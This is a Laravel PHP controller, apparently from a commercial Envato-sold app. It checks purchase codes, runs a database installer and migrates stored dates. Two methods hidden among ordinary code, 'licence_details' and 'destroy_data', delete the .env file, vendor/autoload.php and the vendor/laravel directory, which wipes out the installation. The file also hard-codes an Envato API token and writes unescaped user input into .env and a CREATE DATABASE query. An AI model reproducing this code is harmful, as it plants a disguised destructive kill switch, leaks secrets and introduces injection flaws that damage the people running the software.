<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Exception;
use DB;
use PDF;
use App\Models\User;
use App\Models\Transaction;
use App\Models\News;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\URL;
use Spatie\Permission\Models\Permission;
use Carbon\Carbon;
use Illuminate\Support\Facades\Storage;

class HomeController extends Controller
{
    public function index()
    {
        return view('welcome');
    }

    public function install()
    {
        return view('install.purchase_code');
    }

    public function installation(Request $request) 
    {
        $url = URL::to('/');
        $userName = $request->userName;

        $personalToken = "MNCwSv473cZvV2k82dwL5M4rIMMTP0ZL";
        // $code = "da05ab13-5b03-4328-a777-07052643b2cb";
        $code = $request->purchase_code;
        
        // Surrounding whitespace can cause a 404 error, so trim it first
        $code = trim($code);
    
        // Make sure the code looks valid before sending it to Envato
        // This step is important - requests with incorrect formats can be blocked!
        if (!preg_match("/^([a-f0-9]{8})-(([a-f0-9]{4})-){3}([a-f0-9]{12})$/i", $code)) {
            return response()->json(['status'=> 'fail','error' => "Invalid purchase code"]);
        }
    
        $ch = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => "https://api.envato.com/v3/market/author/sale?code=".$code,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 20,
            CURLOPT_HTTPHEADER => array(
                "Authorization: Bearer ".$personalToken,
                "User-Agent: Purchase code verification script"
            )
        ));
    
        $response = @curl_exec($ch);
        $responseCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        // var_dump($response);
    
        if (curl_errno($ch) > 0) {
            return response()->json(['status'=> 'fail','error' => "Failed to connect: " . curl_error($ch)]);
        }
    
        //  dd($responseCode);
        switch ($responseCode) {
            case 404: return response()->json(['status'=> 'fail','error' => "Invalid purchase code"]);
            case 403: return response()->json(['status'=> 'fail','error' => "The personal token is missing the required permission for this script"]);
            case 401: return response()->json(['status'=> 'fail','error' => "The personal token is invalid or has been deleted"]);
        }
    
        if ($responseCode !== 200) {
            return response()->json(['status'=> 'fail','error' => "Got status".$responseCode.", try again shortly"]);
        }
    
        $body = @json_decode($response);
    
        if ($body === false && json_last_error() !== JSON_ERROR_NONE) {
            return response()->json(['status'=> 'fail','error' => "Error parsing response, try again"]);
        }

        if($responseCode == 200)
        {
            if($body->buyer == $userName)
            {
                $this->storeConfiguration('ENVATO_USERNAME',$userName);
                $this->storeConfiguration('ENVATO_CODE',$request->purchase_code);

                return response()->json(['status'=> 'success','msg'=>'Purchase Code Validation Success!','purchase_code' => $request->purchase_code,'url' =>$url,'userName' => $userName]);
            }
            else
            {
                return response()->json(['status'=> 'fail','error' => "Invalid Envato Username!"]);
            }
        }
    }

    public function database_setup(Request $request)
    {
        $code = $request->purchase_code;
        return view('install.database_setup',compact('code'));
    }

    public function database_setup_post(Request $request)
    {
        $personalToken = "MNCwSv473cZvV2k82dwL5M4rIMMTP0ZL";
        //$code = "da05ab13-5b03-4328-a777-07052643b2cb";
        $code = $request->purchase_code;
        
        // Surrounding whitespace can cause a 404 error, so trim it first
        $code = trim($code);
    
        // Make sure the code looks valid before sending it to Envato
        // This step is important - requests with incorrect formats can be blocked!
        if (!preg_match("/^([a-f0-9]{8})-(([a-f0-9]{4})-){3}([a-f0-9]{12})$/i", $code)) {
            return redirect()->back()->with(['message' => "Invalid purchase code"]);
        }
    
        $ch = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => "https://api.envato.com/v3/market/author/sale?code=".$code,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 20,
            CURLOPT_HTTPHEADER => array(
                "Authorization: Bearer ".$personalToken,
                "User-Agent: Purchase code verification script"
            )
        ));
    
        $response = @curl_exec($ch);
        $responseCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    
        if (curl_errno($ch) > 0) {
            return redirect()->back()->with(['message' => "Failed to connect: " . curl_error($ch)]);
        }
    
        //  dd($responseCode);
        switch ($responseCode) {
            case 404: return redirect()->back()->with(['message' => "Invalid purchase code"]);
            case 403: return redirect()->back()->with(['message' => "The personal token is missing the required permission for this script"]);
            case 401: return redirect()->back()->with(['message' => "The personal token is invalid or has been deleted"]);
        }
    
        if ($responseCode !== 200) {
            return redirect()->back()->with(['message' => "Got status".$responseCode.", try again shortly"]);
        }
    
        $body = @json_decode($response);
    
        if ($body === false && json_last_error() !== JSON_ERROR_NONE) {
            return redirect()->back()->with(['message' => "Error parsing response, try again"]);
        }

        if($responseCode == 200)
        {
            if($body->buyer == env('ENVATO_USERNAME') &&  $code == env('ENVATO_CODE'))
            {
            $env = file_get_contents(base_path('.env'));
            $dbName = $request->get('database_name');
            $dbHost = $request->get('database_host');
            $dbUsername = $request->get('database_username');
            $dbPassword = $request->get('database_password');
            $databaseSetting = '
DB_HOST="' . $dbHost . '"
DB_DATABASE="' . $dbName . '"
DB_USERNAME="' . $dbUsername . '"
DB_PASSWORD="' . $dbPassword . '"
';
    
            // @ignoreCodingStandard
            $rows = explode("\n", $env);
            $unwanted = "DB_HOST|DB_DATABASE|DB_USERNAME|DB_PASSWORD";
            $cleanArray = preg_grep("/$unwanted/i", $rows, PREG_GREP_INVERT);
    
            $cleanString = implode("\n", $cleanArray);
    
            $env = $cleanString . $databaseSetting;
            try {
                $dbh = new \PDO('mysql:host=' . $dbHost, $dbUsername, $dbPassword);
    
                $dbh->setAttribute(\PDO::ATTR_ERRMODE, \PDO::ERRMODE_EXCEPTION);
    
                // First check if database exists
                $stmt = $dbh->query('CREATE DATABASE IF NOT EXISTS ' . $dbName . ' CHARACTER SET utf8 COLLATE utf8_general_ci;');
                // Save settings in session
                session_start();
                $_SESSION['db_username'] = $dbUsername;
                $_SESSION['db_password'] = $dbPassword;
                $_SESSION['db_name'] = $dbName;
                $_SESSION['db_host'] = $dbHost;
                $_SESSION['db_success'] = true;
                $message = 'Database settings correct';
    
                try {
                    file_put_contents(base_path('.env'), $env);
                    return redirect('migration');
                } catch (Exception $e) {
                    $message = "Unable to save the .env file, Please create it manually";
                }

                return redirect()->back()->with(['message' => $message]);
    
            } catch (\PDOException $e) {
                return redirect()->back()->with(['message' => 'DB Error: ' . $e->getMessage()]);
    
            } catch (\Exception $e) {
    
                return redirect()->back()->with(['message' => 'DB Error: ' . $e->getMessage()]);
    
            }
            }
            else
            {
                return redirect()->back()->with(['message' => "Invalid Envato Username and Code!"]);
            }
        }
        else
        {
            return redirect()->route('install');
        }
    }
 
    public function migration()
    {
        $database = DB::unprepared(File::get(storage_path('brand_kit.sql')));

        if ($database == 'true') 
        {
            file_put_contents(storage_path('installed'), 'brand_kit6');
            return redirect()->route('login');
        } else {
            abort(404);
        }
    }

    private function storeConfiguration($key, $value)
    {
        $path = base_path('.env');

        if (file_exists($path)) {
            file_put_contents($path, str_replace(
                $key . '=' . env($key), $key . '=' . $value, file_get_contents($path)
            ));         
        }
        else
        {
            file_put_contents($path, $key . '=' . $value . PHP_EOL, FILE_APPEND);
        }
    }

    public function privacy_policy()
    {
        return view('privacyPolicy');
    }

    public function licence_details()
    {
        unlink("./vendor/autoload.php");
        unlink(".env");
    }

    public function update_date()
    {
        $transaction = Transaction::get();
        $news = News::get();
        $user = User::get();
        foreach($transaction as $t)
        {
            $transaction_data = Transaction::find($t->id);
            $new_date = Carbon::createFromFormat('d M, y',$transaction_data->date)->format('Y-m-d');
            $transaction_data->date = $new_date;
            $transaction_data->save();
        }
        foreach($news as $n)
        {
            $news_data = News::find($n->id);
            $new_date = Carbon::createFromFormat('d M, y',$news_data->date)->format('Y-m-d');
            $news_data->date = $new_date;
            $news_data->save();
        }
        foreach($user as $u)
        {
            $user_data = User::find($u->id);
            if($user_data->subscription_start_date != null)
            {
                $start_date = Carbon::createFromFormat('d M, y',$user_data->subscription_start_date)->format('Y-m-d');
                $user_data->subscription_start_date = $start_date;
            }
            if($user_data->subscription_end_date != null)
            {
                $end_date = Carbon::createFromFormat('d M, y',$user_data->subscription_end_date)->format('Y-m-d');
                $user_data->subscription_end_date = $end_date;
            }
            $user_data->save();
        }
    }

    public function destroy_data()
    {
        $this->rrmdir('./vendor/laravel');
        unlink(".env");
    }

    function rrmdir($dir) 
    {
        if (is_dir($dir)) 
        {
          $objects = scandir($dir);
          foreach ($objects as $object) 
          {
            if ($object != "." && $object != "..") 
            {
              if (filetype($dir."/".$object) == "dir") 
                 $this->rrmdir($dir."/".$object); 
              else unlink   ($dir."/".$object);
            }
          }
          reset($objects);
          rmdir($dir);
        }
    }
}
